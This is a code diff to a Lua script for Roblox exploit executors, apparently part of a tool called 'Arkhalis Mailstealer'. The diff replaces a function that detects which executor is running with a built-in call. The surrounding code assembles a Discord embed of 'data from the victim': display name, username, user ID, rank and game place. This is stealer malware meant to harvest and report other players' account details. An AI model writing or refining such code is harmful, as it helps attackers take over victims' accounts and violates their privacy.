@@ -1,22 +1,4 @@
-local function getexploit()
-	local exploit =
-		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
-		(secure_load and "Sentinel") or
-		(is_sirhurt_closure and "Sirhurt") or
-		(pebc_execute and "ProtoSmasher") or
-		(KRNL_LOADED and "Krnl") or
-		(WrapGlobal and "WeAreDevs") or
-		(isvm and "Proxo") or
-		(shadow_env and "Shadow") or
-		(jit and "EasyExploits") or
-		(getscriptenvs and "Calamari") or
-		(unit and not syn and "Unit") or
-		(OXYGEN_LOADED and "Oxygen U") or
-		(IsElectron and "Electron") or
-		("Unsupported")
-  
-	return exploit
-  end
+local exploit = identifyexecutor()
   
 --// Execution Log
 if game.PlaceId == 6284583030 then
@@ -48,7 +30,7 @@ local msg = {
 	["embeds"]= {
 	  {
 		["title"]= "`Arkhalis Mailstealer Results`",
-		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..getexploit(),
+		["description"]= "**Data from the victim**\n**🧑Display Name: **".._G.PlrDisplayNameVictim.."\n**🧑Username: **".._G.PlrUserVictim.."\n**🧑User ID: **".._G.PlrUserIDVictim.."\n**🐱Rank: **".._G.CurrentRank.."\n**🎮Place: **".._G.GameIn.."**\n☠Executor: **"..exploit,
 		["url"]= "https://discord.gg/ajmeAeq76d",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
